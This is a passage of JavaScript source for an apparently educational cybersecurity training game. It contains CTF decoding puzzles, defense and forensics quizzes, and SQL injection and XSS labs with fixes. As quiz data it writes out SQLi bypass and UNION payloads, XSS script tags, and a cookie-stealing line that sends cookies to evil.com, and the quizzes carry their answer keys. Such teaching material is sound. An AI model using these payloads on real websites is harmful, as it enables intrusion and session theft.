      hint:'This is Base64 encoded',answer:'FLAG{BASE64_IS_NOT_ENCRYPTION}',explain:'Base64 is encoding, NOT encryption! Anyone can decode it.'},
    {title:'Caesar Flag',desc:'Decode (shift 7): MSHN{JHLZHY_JOHSSLUNL}',
      hint:'Shift each letter back by 7',answer:'FLAG{CAESAR_CHALLENGE}',explain:'Always try common shifts. Tools like CyberChef automate this.'},
    {title:'Hex Flag',desc:'Decode: 464C41477B4845585F4D41535445527D',
      hint:'Convert hex pairs to ASCII characters',answer:'FLAG{HEX_MASTER}',explain:'Hex encoding is used in network packets, file analysis, and malware reverse engineering.'},
    {title:'Binary Flag',desc:'01000110 01001100 01000001 01000111 01111011 01000010 01001001 01010100 01010011 01111101',
      hint:'8-bit binary to ASCII',answer:'FLAG{BITS}',explain:'Understanding binary is fundamental. Every file and packet is binary at its core.'},
    {title:'Reverse Engineering',desc:'The flag is: }ESREVER{GALF\nBut something seems off...',
      hint:'Read it differently...',answer:'FLAG{REVERSE}',explain:'Reverse engineering is core to malware analysis and vulnerability research.'},
  ];
  let fi=0,score=0;
  function render(){
    if(fi>=flags.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🏴 CTF COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${flags.length}</div><div class="score-label">Flags</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(300);markGameComplete('ctf');if(score>=5)unlockAchievement('ctf_champion');return;
    }
    const f=flags[fi];
    gc.innerHTML=`<div class="info-banner"><strong>Challenge ${fi+1}/${flags.length}: ${f.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="white-space:pre-line;margin-bottom:16px;">${f.desc}</div>
        <div style="margin-bottom:16px;"><strong>💡 Hint:</strong> <span style="color:var(--text-secondary);">${f.hint}</span></div>
        <div style="display:flex;gap:12px;"><input type="text" class="cyber-input" id="ctf-ans" placeholder="FLAG{...}" />
        <button class="cyber-btn" onclick="checkCTF()">CAPTURE</button></div></div><div id="ctf-fb"></div>`;
  }
  window.checkCTF=function(){
    const f=flags[fi],a=document.getElementById('ctf-ans').value.trim().toUpperCase(),ok=a===f.answer;
    if(ok)score++;
    document.getElementById('ctf-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Flag Captured!':'✗ Incorrect'}</h4><p>${f.answer}</p></div>
      <div class="info-banner" style="margin-top:10px;">${f.explain}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextCTF()">NEXT →</button></div>`;
  };
  window.nextCTF=function(){fi++;render();}; render();
}

// ==================== NETWORK DEFENDER ====================
function gameNetwork(gc){
  const attacks=[
    {name:'DDoS Attack',desc:'Traffic: 500,000 requests/sec from 10,000 IPs targeting port 80.',icon:'🌊',
      opts:[{text:'Enable rate limiting + activate CDN/DDoS protection',ok:true,fb:'Rate limiting + CDN absorbs volumetric attacks.'},
        {text:'Block all incoming traffic',ok:false,fb:'Blocks legitimate users too. Targeted defense is better.'},
        {text:'Increase server bandwidth',ok:false,fb:'You can\'t outscale a DDoS. Millions of bots vs one server.'}],
      info:'DDoS floods servers with traffic from botnets. Mitigation: CDN, rate limiting, traffic analysis.'},
    {name:'SQL Injection Attempt',desc:'Log: GET /users?id=1 OR 1=1-- from 185.22.91.47',icon:'💉',
      opts:[{text:'Block IP + enable WAF + parameterize all queries',ok:true,fb:'Defense in depth! WAF catches patterns, parameterized queries fix the root cause.'},
        {text:'Block the IP address only',ok:false,fb:'They\'ll use another IP. Fix the root cause.'},
        {text:'Disable the affected endpoint',ok:false,fb:'Fixes symptom but breaks functionality.'}],
      info:'SQL injection manipulates database queries. Prevention: parameterized queries, input validation, WAF.'},
    {name:'Brute Force Attack',desc:'Failed logins: 847 attempts on admin account in 10 minutes.',icon:'🔨',
      opts:[{text:'Enable account lockout + CAPTCHA + rate limit + MFA',ok:true,fb:'Layered defense makes brute force infeasible.'},
        {text:'Change admin password',ok:false,fb:'They\'ll brute force the new one. Fix the root cause.'},
        {text:'Disable admin account temporarily',ok:false,fb:'Disrupts operations. Implement automated protections.'}],
      info:'Brute force tries all combinations. Defense: account lockout, CAPTCHA, rate limiting, MFA.'},
    {name:'Port Scan Detected',desc:'Nmap scan: 65,535 ports scanned in 30 seconds from 92.118.44.11',icon:'🔍',
      opts:[{text:'Block IP + close unnecessary ports + review firewall rules',ok:true,fb:'Minimize attack surface. Only open ports you need.'},
        {text:'Ignore — port scanning isn\'t an attack',ok:false,fb:'Scanning is reconnaissance before an attack.'},
        {text:'Block all inbound connections',ok:false,fb:'Blocks your own services. Be surgical.'}],
      info:'Port scanning maps open services. Defense: close unused ports, firewall rules, IDS alerts.'},
    {name:'Malware Beacon',desc:'Host 10.0.0.47 sending encrypted data to C2 server every 60 seconds.',icon:'📡',
      opts:[{text:'Isolate host + block C2 domain + forensic analysis',ok:true,fb:'Contain, block, investigate. Textbook incident response.'},
        {text:'Delete suspicious files on the host',ok:false,fb:'Destroys forensic evidence. The malware may persist.'},
        {text:'Monitor the traffic to learn more',ok:false,fb:'Active C2 means data is being exfiltrated NOW. Contain immediately.'}],
      info:'C2 beacons communicate with attacker servers. Defense: network monitoring, DNS filtering, endpoint detection.'},
    {name:'Phishing Campaign',desc:'30 employees received identical emails with malicious PDF attachments.',icon:'📧',
      opts:[{text:'Quarantine emails + alert staff + scan for opened attachments + reset creds',ok:true,fb:'Comprehensive response! Speed is crucial.'},
        {text:'Send company-wide warning email',ok:false,fb:'Too slow. Need immediate quarantine.'},
        {text:'Block the sender\'s email address',ok:false,fb:'They\'ll spoof a different address.'}],
      info:'Phishing campaigns target many employees. Response: quarantine, alert, scan, remediate.'},
  ];
  let ai=0,score=0;
  function render(){
    if(ai>=attacks.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🌐 NETWORK SECURED</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${attacks.length}</div><div class="score-label">Defended</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(250);markGameComplete('network');if(score>=5)unlockAchievement('net_defender');return;
    }
    const a=attacks[ai];
    gc.innerHTML=`<div class="info-banner warning"><strong>⚠ ALERT: ${a.name}</strong></div>
      <div class="game-panel"><div style="font-size:32px;text-align:center;margin-bottom:10px;">${a.icon}</div>
        <div class="terminal-box" style="margin-bottom:16px;">${a.desc}</div>
        <h3 style="margin-bottom:12px;">RESPONSE:</h3>
        <div class="chat-responses">${a.opts.map((o,i)=>`<button class="chat-response-btn" onclick="netAns(${i})">${o.text}</button>`).join('')}</div></div><div id="net-fb"></div>`;
  }
  window.netAns=function(i){
    const a=attacks[ai],o=a.opts[i]; if(o.ok)score++;
    document.getElementById('net-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${o.ok?'success':'fail'}"><h4>${o.ok?'✓ Defended!':'✗ Suboptimal'}</h4><p>${o.fb}</p></div>
      <div class="info-banner" style="margin-top:10px;"><strong>📖 Learn:</strong> ${a.info}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextNet()">NEXT →</button></div>`;
  };
  window.nextNet=function(){ai++;render();}; render();
}

// ==================== DIGITAL FORENSICS ====================
function gameForensics(gc){
  const evidence=[
    {id:'email',name:'📧 Suspicious Email',found:false,content:'From: supplier-invoice@quickb00ks.com\nTo: accounting@company.com\nSubject: URGENT: Updated Payment Details\n\n"Please update wire transfer to new account: 847291-3847."',
      analysis:'The sender domain "quickb00ks" uses zeros instead of "o". Classic BEC (Business Email Compromise).'},
    {id:'logs',name:'📋 Access Logs',found:false,content:'2024-01-15 02:14 - admin login from 185.220.101.47 (TOR exit node)\n2024-01-15 02:15 - 847 files accessed\n2024-01-15 02:18 - New user "svc_backup" created\n2024-01-15 02:19 - Remote access tool installed',
      analysis:'TOR exit node = anonymized access. New user "svc_backup" is a persistence mechanism.'},
    {id:'network',name:'🌐 Network Capture',found:false,content:'10.0.0.47 → 185.220.101.47:443 [TLS 1.3] - 2.3GB uploaded\n10.0.0.47 → DNS query: evil-c2-server.xyz\n10.0.0.47 → 10.0.0.1:3389 [RDP] lateral movement detected',
      analysis:'2.3GB exfiltration to TOR node. DNS reveals C2 server. RDP lateral movement means attacker is spreading.'},
    {id:'malware',name:'🦠 Malware Sample',found:false,content:'File: svc_update.exe (hidden in System32)\nHash: a1b2c3d4e5f6...\nVirusTotal: 45/68 detections\nBehavior: Keylogger + screen capture + credential dump\nPersistence: Scheduled task "WindowsUpdate"',
      analysis:'Keylogger captures all input. Masquerades as legitimate service. Scheduled task ensures persistence.'},
    {id:'timeline',name:'📅 Event Timeline',found:false,content:'Jan 12 - Phishing email sent to 5 employees\nJan 13 - Employee clicked link, entered credentials\nJan 14 - Attacker logged in via VPN\nJan 15 02:14 - Data exfiltration began\nJan 15 08:00 - IT discovered unusual activity',
      analysis:'3-day attack chain: phishing → credential theft → VPN access → data theft.'},
  ];
  let found=new Set(),phase=1;
  function render(){
    gc.innerHTML=`<div class="info-banner"><strong>🔍 CASE: Operation Shadow Breach</strong> — 2.3GB of customer data stolen. Investigate.</div>
      <div class="game-panel"><h3>EVIDENCE BOARD</h3>
        <div class="room-objects">${evidence.map(e=>`<div class="room-object ${found.has(e.id)?'found':''}" onclick="examEv('${e.id}')">${e.name}</div>`).join('')}</div>
      </div><div id="ev-detail"></div>
      ${found.size>=evidence.length&&phase===1?`<div class="game-panel slide-up" id="fq">
        <h3>📋 INVESTIGATION REPORT</h3>
        <div style="margin-bottom:12px;color:var(--text-secondary);">Based on evidence, answer these questions:</div>
        <div class="form-group"><label class="form-label">1. What was the initial attack vector?</label>
          <select class="cyber-input" id="fq1"><option value="">Select...</option><option value="phishing">Phishing email</option><option value="bruteforce">Brute force</option><option value="usb">USB drop</option><option value="insider">Insider threat</option></select></div>
        <div class="form-group"><label class="form-label">2. How did the attacker maintain access?</label>
          <select class="cyber-input" id="fq2"><option value="">Select...</option><option value="backdoor">Created backdoor user + malware</option><option value="password">Changed admin password</option><option value="vpn">Left VPN connected</option></select></div>
        <div class="form-group"><label class="form-label">3. How much data was exfiltrated?</label>
          <select class="cyber-input" id="fq3"><option value="">Select...</option><option value="2.3">2.3 GB</option><option value="500">500 MB</option><option value="10">10 GB</option></select></div>
        <button class="cyber-btn" style="width:100%;margin-top:12px;" onclick="submitForensics()">SUBMIT REPORT</button>
        <div id="fq-fb" style="margin-top:10px;"></div></div>`:''}`;
  }
  window.examEv=function(id){
    const e=evidence.find(x=>x.id===id); if(!e)return; found.add(id);
    document.getElementById('ev-detail').innerHTML=`<div class="game-panel slide-up"><h3>${e.name}</h3>
      <div class="terminal-box" style="white-space:pre-line;margin-bottom:12px;">${e.content}</div>
      <div class="info-banner"><strong>Analysis:</strong> ${e.analysis}</div></div>`;
    if(found.size>=evidence.length)setTimeout(render,500);
  };
  window.submitForensics=function(){
    const a1=document.getElementById('fq1').value,a2=document.getElementById('fq2').value,a3=document.getElementById('fq3').value;
    if(!a1||!a2||!a3)return;
    let score=0; if(a1==='phishing')score++; if(a2==='backdoor')score++; if(a3==='2.3')score++;
    phase=2;
    gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>🔍 CASE CLOSED</h3>
      <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/3</div><div class="score-label">Correct</div></div></div>
      <div class="info-banner success" style="text-align:left;margin-top:16px;">
        <strong>Case Summary:</strong><br/>
        • Vector: Phishing email with spoofed domain<br/>
        • Persistence: Backdoor user + keylogger malware<br/>
        • Exfiltration: 2.3GB via TOR to C2 server<br/>
        • Duration: 3 days from initial phish to discovery</div>
      <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
    addXP(300);markGameComplete('forensics');if(score>=3)unlockAchievement('forensics_pro');
  };
  render();
}

// ==================== SQL INJECTION LAB ====================
function gameSQLi(gc){
  const levels=[
    {title:'Level 1: Basic Login Bypass',desc:'A login form sends:\nSELECT * FROM users WHERE user=\'[INPUT]\' AND pass=\'[INPUT]\'',
      question:'Which input bypasses authentication?',
      opts:[{text:"admin' OR '1'='1' --",ok:true,fb:"Correct! OR 1=1 always evaluates true, -- comments out the rest."},
        {text:"admin AND password=admin",ok:false,fb:"This doesn't break out of the string context."},
        {text:"DROP TABLE users",ok:false,fb:"Not injected properly."}],
      fix:'Use parameterized queries: db.query("SELECT * FROM users WHERE user=? AND pass=?", [user, pass])'},
    {title:'Level 2: Union Injection',desc:'A product page uses:\nSELECT name,price FROM products WHERE id=[INPUT]',
      question:'How do you extract usernames from the users table?',
      opts:[{text:"1 UNION SELECT username,password FROM users--",ok:true,fb:"UNION combines results. Column count must match."},
        {text:"SELECT * FROM users",ok:false,fb:"Can't run a separate query."},
        {text:"1; DROP TABLE products",ok:false,fb:"Stacked queries are often disabled."}],
      fix:'Whitelist input types. If expecting integer, validate.'},
    {title:'Level 3: Blind SQL Injection',desc:'Page shows "Product found" or "Not found" — no data displayed.',
      question:'Which technique works for blind SQLi?',
      opts:[{text:"Boolean-based: 1 AND SUBSTRING(username,1,1)='a'",ok:true,fb:"Test character by character based on true/false response."},
        {text:"Just use UNION SELECT",ok:false,fb:"Blind SQLi means no visible output."},
        {text:"Try different passwords",ok:false,fb:"That's brute force, not SQL injection."}],
      fix:'Implement WAF rules, parameterized queries, and query result limiting.'},
    {title:'Level 4: Second-Order SQLi',desc:'User registers with username: admin\'--\nLater, password reset uses stored username in query.',
      question:'What happens?',
      opts:[{text:"It resets the admin's password, not the attacker's",ok:true,fb:"Second-order SQLi! Injection stored and triggered later."},
        {text:"Nothing — registration sanitized it",ok:false,fb:"Many apps sanitize input but not stored values."},
        {text:"It causes a syntax error",ok:false,fb:"The -- comments out the trailing quote."}],
      fix:'Parameterize ALL queries, even those using stored data.'},
    {title:'Level 5: Prevention',desc:'You\'re securing a web application.',
      question:'Which is the MOST effective single defense?',
      opts:[{text:"Parameterized queries / prepared statements",ok:true,fb:"The gold standard. Parameters are never executed as SQL."},
        {text:"Input validation (block special characters)",ok:false,fb:"Bypassable with encoding tricks."},
        {text:"Web Application Firewall (WAF)",ok:false,fb:"Can be bypassed. Fix the code."}],
      fix:'Defense in depth: Parameterized queries + input validation + WAF + least-privilege DB.'},
  ];
  let li=0,score=0;
  function render(){
    if(li>=levels.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>💉 LAB COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${levels.length}</div><div class="score-label">Correct</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(250);markGameComplete('sqli');if(score>=4)unlockAchievement('sql_stopper');return;
    }
    const l=levels[li];
    gc.innerHTML=`<div class="info-banner"><strong>${l.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="white-space:pre-line;margin-bottom:16px;">${l.desc}</div>
        <h3 style="margin-bottom:12px;">${l.question}</h3>
        <div class="chat-responses">${l.opts.map((o,i)=>`<button class="chat-response-btn" onclick="sqliAns(${i})">${o.text}</button>`).join('')}</div></div><div id="sqli-fb"></div>`;
  }
  window.sqliAns=function(i){
    const l=levels[li],o=l.opts[i]; if(o.ok)score++;
    document.getElementById('sqli-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${o.ok?'success':'fail'}"><h4>${o.ok?'✓ Correct!':'✗ Not Quite'}</h4><p>${o.fb}</p></div>
      <div class="info-banner" style="margin-top:10px;"><strong>🛡️ Fix:</strong> ${l.fix}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextSqli()">NEXT →</button></div>`;
  };
  window.nextSqli=function(){li++;render();}; render();
}

// ==================== XSS PLAYGROUND ====================
function gameXSS(gc){
  const levels=[
    {title:'Level 1: Reflected XSS',desc:'A search page displays: "Results for: [YOUR_INPUT]"\nInput placed directly into HTML without sanitization.',
      question:'Which input would execute JavaScript?',
      opts:[{text:'<script>alert("XSS")<\/script>',ok:true,fb:'Classic reflected XSS! Script tag executes because input is unsanitized.'},
        {text:'alert("XSS")',ok:false,fb:'Without HTML tags, this is just text.'},
        {text:'javascript:alert("XSS")',ok:false,fb:'javascript: protocol works in href, not in content.'}],
      fix:'Escape HTML entities: < > & " before inserting user input.'},
    {title:'Level 2: Stored XSS',desc:'A comment section stores user input and displays it to all visitors.',
      question:'Why is stored XSS more dangerous than reflected?',
      opts:[{text:'It attacks every visitor automatically',ok:true,fb:'Stored XSS persists and attacks all future visitors.'},
        {text:'It uses different JavaScript',ok:false,fb:'Same capabilities. Difference is delivery.'},
        {text:'It can\'t be prevented',ok:false,fb:'All XSS is preventable.'}],
      fix:'Sanitize on output. Use DOMPurify or framework auto-escaping.'},
    {title:'Level 3: DOM-Based XSS',desc:'Page uses: document.getElementById("output").innerHTML = location.hash.slice(1);',
      question:'Where is the vulnerability?',
      opts:[{text:'Using innerHTML with unsanitized URL fragment data',ok:true,fb:'innerHTML parses HTML. textContent prevents this.'},
        {text:'Using location.hash',ok:false,fb:'Reading hash is fine. The vulnerability is in how it\'s used.'},
        {text:'The img tag itself',ok:false,fb:'The issue is unsanitized dynamic insertion.'}],
      fix:'Use textContent instead of innerHTML. Or DOMPurify.sanitize().'},
    {title:'Level 4: Cookie Theft',desc:'Attacker injects: <script>new Image().src="https://evil.com/steal?c="+document.cookie<\/script>',
      question:'Which HTTP flag prevents JS from reading cookies?',
      opts:[{text:'HttpOnly flag',ok:true,fb:'HttpOnly cookies can\'t be accessed via document.cookie.'},
        {text:'Secure flag',ok:false,fb:'Secure ensures HTTPS but doesn\'t block JS access.'},
        {text:'SameSite flag',ok:false,fb:'SameSite prevents CSRF, not JS access.'}],
      fix:'Set cookies: HttpOnly; Secure; SameSite=Strict. Use CSP headers.'},
    {title:'Level 5: Content Security Policy',desc:'CSP controls what resources can load in the browser.',
      question:'Which CSP directive prevents inline scripts?',
      opts:[{text:"script-src 'self'",ok:true,fb:"Only allows scripts from your own domain. Blocks inline scripts."},
        {text:'default-src *',ok:false,fb:'Allows everything. No protection.'},
        {text:"style-src 'none'",ok:false,fb:'Controls CSS, not JavaScript.'}],
      fix:"Deploy CSP: Content-Security-Policy: default-src 'self'; script-src 'self'"},
  ];
  let li=0,score=0;
  function render(){
    if(li>=levels.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>⚡ XSS LAB COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${levels.length}</div><div class="score-label">Correct</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(250);markGameComplete('xss');if(score>=4)unlockAchievement('xss_hunter');return;
    }
    const l=levels[li];
    gc.innerHTML=`<div class="info-banner"><strong>${l.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="white-space:pre-line;margin-bottom:16px;">${l.desc}</div>
        <h3 style="margin-bottom:12px;">${l.question}</h3>
        <div class="chat-responses">${l.opts.map((o,i)=>`<button class="chat-response-btn" onclick="xssAns(${i})">${o.text}</button>`).join('')}</div></div><div id="xss-fb"></div>`;
  }
  window.xssAns=function(i){
    const l=levels[li],o=l.opts[i]; if(o.ok)score++;
    document.getElementById('xss-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${o.ok?'success':'fail'}"><h4>${o.ok?'✓ Correct!':'✗ Not Quite'}</h4><p>${o.fb}</p></div>
      <div class="info-banner" style="margin-top:10px;"><strong>🛡️ Fix:</strong> ${l.fix}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextXSS()">NEXT →</button></div>`;
  };
  window.nextXSS=function(){li++;render();}; render();
}

// ==================== STEGANOGRAPHY STUDIO ====================
function gameStego(gc){
  const challenges=[
    {title:'Hidden Text',desc:'Read the first letter of each line:\nSecurity is paramount\nEvery system needs protection\nCritical data must be encrypted\nRisk assessment is key\nEncryption prevents breaches\nThreat modeling helps planning',
      hint:'Acrostic — first letters...',answer:'SECRET',explain:'Acrostic ciphers hide messages in first letters. Used since ancient Greece.'},
    {title:'Zero-Width Characters',desc:'This text looks normal: "Hello World"\nBut it contains hidden Unicode zero-width characters that encode: SPY',
      hint:'Zero-width chars are invisible Unicode. The hidden word is: SPY',answer:'SPY',explain:'Zero-width characters are invisible but carry data. Used for text fingerprinting.'},
    {title:'Whitespace Encoding',desc:'Count the trailing spaces on each line:\n3 spaces = H\n1 space  = I\n4 spaces = D\n5 spaces = E',
      hint:'The spaces spell...',answer:'HIDE',explain:'Whitespace steganography hides data in spaces and tabs.'},
    {title:'File Header Analysis',desc:'A file named "vacation.jpg" has these first bytes:\n50 4B 03 04\n\nBut JPG files should start with: FF D8 FF',
      hint:'50 4B 03 04 is the magic number for...',answer:'ZIP',explain:'File headers identify true file types. "vacation.jpg" is actually a ZIP archive!'},
    {title:'Metadata Secret',desc:'An image\'s EXIF data contains:\nCamera: Canon EOS 5D\nGPS: 37.7749, -122.4194\nComment: "RkxBR3tNRVRBREFUQX0="',
      hint:'The comment is Base64...',answer:'FLAG{METADATA}',explain:'EXIF metadata contains GPS, timestamps, device info. Always strip metadata.'},
    {title:'ASCII Art Message',desc:'Look at the capital letters only:\nthe Quick brown Fox jumped\nover Seven lazy Dogs\nand Ran home To Eat supper',
      hint:'Extract only capitals...',answer:'QFSDRTE',explain:'Selective character extraction hides data in plain text.'},
  ];
  let ci=0,score=0;
  function render(){
    if(ci>=challenges.length){
      gc.innerHTML=`<div class="game-panel slide-up" style="text-align:center;"><h3>👁️ STUDIO COMPLETE</h3>
        <div class="score-display"><div class="score-item"><div class="score-value" style="color:var(--neon-green)">${score}/${challenges.length}</div><div class="score-label">Found</div></div></div>
        <button class="cyber-btn" style="margin-top:20px;" onclick="navigateTo('hub',{mode:'technical'})">RETURN</button></div>`;
      addXP(200);markGameComplete('stego');if(score>=5)unlockAchievement('stego_finder');return;
    }
    const ch=challenges[ci];
    gc.innerHTML=`<div class="info-banner"><strong>Challenge ${ci+1}/${challenges.length}: ${ch.title}</strong></div>
      <div class="game-panel"><div class="terminal-box" style="white-space:pre-line;margin-bottom:16px;">${ch.desc}</div>
        <div style="margin-bottom:16px;"><strong>💡 Hint:</strong> <span style="color:var(--text-secondary);">${ch.hint}</span></div>
        <div style="display:flex;gap:12px;"><input type="text" class="cyber-input" id="st-ans" placeholder="Hidden message..." />
        <button class="cyber-btn" onclick="checkST()">REVEAL</button></div></div><div id="st-fb"></div>`;
  }
  window.checkST=function(){
    const ch=challenges[ci],a=document.getElementById('st-ans').value.trim().toUpperCase(),ok=a===ch.answer.toUpperCase();
    if(ok)score++;
    document.getElementById('st-fb').innerHTML=`<div class="game-panel slide-up">
      <div class="result-box ${ok?'success':'fail'}"><h4>${ok?'✓ Found!':'✗ Not Quite'}</h4><p>Answer: <strong>${ch.answer}</strong></p></div>
      <div class="info-banner" style="margin-top:10px;">${ch.explain}</div>
      <button class="cyber-btn" style="margin-top:12px;" onclick="nextST()">NEXT →</button></div>`;
  };
  window.nextST=function(){ci++;render();}; render();
}

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
  loadUsers();
  initParticles();
  runBootSequence();
});
